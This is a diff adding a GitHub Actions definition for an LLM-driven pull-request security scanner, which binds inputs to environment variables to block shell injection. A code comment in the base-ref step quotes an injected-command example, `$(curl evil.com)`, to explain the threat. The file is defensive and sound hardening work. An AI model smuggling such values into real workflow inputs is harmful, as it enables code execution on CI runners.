@@ -1,0 +1,250 @@
+name: 'security-audit'
+description: 'LLM-driven security review for pull requests. Analyzes the diff with Claude and posts findings as a PR comment.'
+author: 'Dmytro Soroka'
+branding:
+  icon: 'shield'
+  color: 'red'
+
+inputs:
+  anthropic-api-key:
+    description: 'Anthropic API key. Provide either this or openai-api-key.'
+    required: false
+    default: ''
+  openai-api-key:
+    description: 'OpenAI API key. Provide either this or anthropic-api-key.'
+    required: false
+    default: ''
+  provider:
+    description: 'LLM provider: auto | anthropic | openai. Default: auto (uses whichever key is set).'
+    required: false
+    default: 'auto'
+  base-ref:
+    description: 'Git ref to diff against. Default: PR base ref (auto-detected from $GITHUB_BASE_REF).'
+    required: false
+    default: ''
+  model:
+    description: 'Model alias or full ID. anthropic: sonnet|haiku|opus|<id>. openai: best|cheap|4o|mini|<id>. Default: provider default.'
+    required: false
+    default: ''
+  fail-on:
+    description: 'Block PR on findings of this severity or higher. critical | high | medium | low | info | none.'
+    required: false
+    default: 'critical'
+  comment-on-pr:
+    description: 'Post results as a PR comment.'
+    required: false
+    default: 'true'
+  upload-sarif:
+    description: 'Upload SARIF to GitHub Code Scanning.'
+    required: false
+    default: 'false'
+  include:
+    description: 'Comma-separated file globs to include (e.g. "**/*.ts,**/*.tsx").'
+    required: false
+    default: ''
+  exclude:
+    description: 'Comma-separated file globs to exclude beyond the defaults.'
+    required: false
+    default: ''
+  max-files:
+    description: 'Cap on files analyzed per run (large PRs get truncated).'
+    required: false
+    default: '50'
+
+outputs:
+  findings-count:
+    description: 'Total number of findings.'
+    value: ${{ steps.run.outputs.findings_count }}
+  highest-severity:
+    description: 'Highest severity found (critical|high|medium|low|info|none).'
+    value: ${{ steps.run.outputs.highest_severity }}
+  report-path:
+    description: 'Path to the JSON report.'
+    value: ${{ steps.run.outputs.report_path }}
+
+runs:
+  using: 'composite'
+  steps:
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '20'
+
+    - name: Install security-audit deps
+      shell: bash
+      working-directory: ${{ github.action_path }}
+      run: |
+        if [ -f pnpm-lock.yaml ]; then
+          npm install -g pnpm
+          pnpm install --frozen-lockfile --ignore-workspace
+        else
+          npm install --no-audit --no-fund
+        fi
+
+    - name: Determine base ref
+      id: base
+      shell: bash
+      # All user-controlled values are routed through env vars and quoted on
+      # use — `${{ inputs.* }}` is NEVER interpolated directly into the bash
+      # body. Direct interpolation lets a malicious workflow input that
+      # contains shell metacharacters (e.g. `$(curl evil.com)` or backticks)
+      # execute on the runner. Ironic for a security tool to ship that
+      # vector; keep all four bash blocks below in this pattern.
+      env:
+        INPUT_BASE_REF: ${{ inputs.base-ref }}
+      run: |
+        if [ -n "$INPUT_BASE_REF" ]; then
+          REF="$INPUT_BASE_REF"
+        elif [ -n "$GITHUB_BASE_REF" ]; then
+          REF="origin/$GITHUB_BASE_REF"
+        else
+          REF="origin/main"
+        fi
+        echo "ref=$REF" >> "$GITHUB_OUTPUT"
+        echo "Using base ref: $REF"
+
+    - name: Validate provider configuration
+      shell: bash
+      env:
+        # API keys via env, not direct interpolation — same rationale as the
+        # base-ref step. The previous body did `[ -z "${{ inputs.* }}" ]` which
+        # would execute attacker-controlled key content if it contained `"`
+        # followed by shell syntax.
+        ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
+        OPENAI_API_KEY: ${{ inputs.openai-api-key }}
+      run: |
+        if [ -z "$ANTHROPIC_API_KEY" ] && [ -z "$OPENAI_API_KEY" ]; then
+          echo "::error::security-audit requires either anthropic-api-key or openai-api-key input."
+          exit 1
+        fi
+
+    - name: Run security-audit scan
+      id: run
+      shell: bash
+      # Every workflow-controlled value is bound to an env var here so the
+      # bash body below references "$VAR" (a literal expansion) rather than
+      # ${{ inputs.* }} (a literal text substitution into the script).
+      # The latter would let an input containing `$(...)` or backticks
+      # execute on the runner before bash ever quotes it.
+      env:
+        ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
+        OPENAI_API_KEY: ${{ inputs.openai-api-key }}
+        INPUT_PROVIDER: ${{ inputs.provider }}
+        INPUT_MODEL: ${{ inputs.model }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
+        INPUT_INCLUDE: ${{ inputs.include }}
+        INPUT_EXCLUDE: ${{ inputs.exclude }}
+        INPUT_MAX_FILES: ${{ inputs.max-files }}
+        BASE_REF: ${{ steps.base.outputs.ref }}
+        COMMIT_SHA: ${{ github.sha }}
+        ACTION_PATH: ${{ github.action_path }}
+      run: |
+        set -o pipefail
+
+        # Build include/exclude as bash ARRAYS, not strings. Passing arrays
+        # through "${ARR[@]}" preserves token boundaries for globs that
+        # contain spaces or quotes; the previous pattern (concatenating
+        # into one string and re-splitting on $IFS) broke legitimate inputs
+        # AND re-opened the injection surface for crafted ones.
+        INCLUDE_ARGS=()
+        if [ -n "$INPUT_INCLUDE" ]; then
+          IFS=',' read -ra INCS <<< "$INPUT_INCLUDE"
+          for g in "${INCS[@]}"; do
+            [ -n "$g" ] && INCLUDE_ARGS+=("--include=$g")
+          done
+        fi
+        EXCLUDE_ARGS=()
+        if [ -n "$INPUT_EXCLUDE" ]; then
+          IFS=',' read -ra EXCS <<< "$INPUT_EXCLUDE"
+          for g in "${EXCS[@]}"; do
+            [ -n "$g" ] && EXCLUDE_ARGS+=("--exclude=$g")
+          done
+        fi
+
+        # Optional --model flag — array form avoids the empty-flag case
+        # (`--model=` would parse but is meaningless to scan_diff).
+        MODEL_ARG=()
+        if [ -n "$INPUT_MODEL" ]; then
+          MODEL_ARG=("--model=$INPUT_MODEL")
+        fi
+
+        REPORT_DIR="$RUNNER_TEMP/security-audit"
+        mkdir -p "$REPORT_DIR"
+
+        # Run, capturing JSON and exit code (don't fail step yet — we want to comment first)
+        EXIT=0
+        node "$ACTION_PATH/scripts/scan_diff.mjs" \
+          "--against=$BASE_REF" \
+          "--provider=$INPUT_PROVIDER" \
+          "${MODEL_ARG[@]}" \
+          "--fail-on=$INPUT_FAIL_ON" \
+          --format=json \
+          --output="$REPORT_DIR/report.json" \
+          "--max-files=$INPUT_MAX_FILES" \
+          "${INCLUDE_ARGS[@]}" "${EXCLUDE_ARGS[@]}" || EXIT=$?
+
+        # Also produce PR comment markdown + SARIF
+        node "$ACTION_PATH/scripts/format_pr_comment.mjs" \
+          --input="$REPORT_DIR/report.json" \
+          "--commit-sha=$COMMIT_SHA" \
+          > "$REPORT_DIR/pr-comment.md" || true
+
+        node "$ACTION_PATH/scripts/format_sarif.mjs" \
+          --input="$REPORT_DIR/report.json" \
+          --output="$REPORT_DIR/report.sarif" || true
+
+        # Surface outputs. Pass the report path through env to the inline
+        # node scripts rather than interpolating $REPORT_DIR into a JS
+        # string literal — that would let any path containing a single
+        # quote break out of the literal and execute attacker JS.
+        COUNT=$(REPORT_PATH="$REPORT_DIR/report.json" \
+          node -e "console.log(JSON.parse(require('fs').readFileSync(process.env.REPORT_PATH)).findings.length)" \
+          2>/dev/null || echo 0)
+        HIGHEST=$(REPORT_PATH="$REPORT_DIR/report.json" \
+          node -e "
+            const r = JSON.parse(require('fs').readFileSync(process.env.REPORT_PATH));
+            const rank = ['critical','high','medium','low','info'];
+            const top = rank.find(s => (r.summary?.by_severity?.[s] || 0) > 0) || 'none';
+            console.log(top);
+          " 2>/dev/null || echo none)
+
+        # Group writes to $GITHUB_OUTPUT under one redirection — fewer
+        # process spawns and quotes the file name once instead of six times.
+        {
+          echo "findings_count=$COUNT"
+          echo "highest_severity=$HIGHEST"
+          echo "report_path=$REPORT_DIR/report.json"
+          echo "comment_path=$REPORT_DIR/pr-comment.md"
+          echo "sarif_path=$REPORT_DIR/report.sarif"
+          echo "scan_exit_code=$EXIT"
+        } >> "$GITHUB_OUTPUT"
+
+    - name: Post PR comment
+      if: ${{ github.event_name == 'pull_request' && inputs.comment-on-pr == 'true' }}
+      uses: marocchino/sticky-pull-request-comment@v2
+      with:
+        header: security-audit
+        path: ${{ steps.run.outputs.comment_path }}
+
+    - name: Upload SARIF to GitHub Code Scanning
+      if: ${{ inputs.upload-sarif == 'true' }}
+      uses: github/codeql-action/upload-sarif@v3
+      with:
+        sarif_file: ${{ steps.run.outputs.sarif_path }}
+
+    - name: Enforce severity gate
+      shell: bash
+      env:
+        SCAN_EXIT_CODE: ${{ steps.run.outputs.scan_exit_code }}
+        INPUT_FAIL_ON: ${{ inputs.fail-on }}
+        HIGHEST_SEVERITY: ${{ steps.run.outputs.highest_severity }}
+        FINDINGS_COUNT: ${{ steps.run.outputs.findings_count }}
+      run: |
+        if [ "$SCAN_EXIT_CODE" = "2" ]; then
+          echo "::error::security-audit found findings at or above --fail-on threshold ($INPUT_FAIL_ON). Highest: $HIGHEST_SEVERITY."
+          exit 1
+        elif [ "$SCAN_EXIT_CODE" = "3" ]; then
+          echo "::error::security-audit tool error (exit 3)."
+          exit 1
+        fi
+        echo "security-audit completed — $FINDINGS_COUNT finding(s), highest=$HIGHEST_SEVERITY."
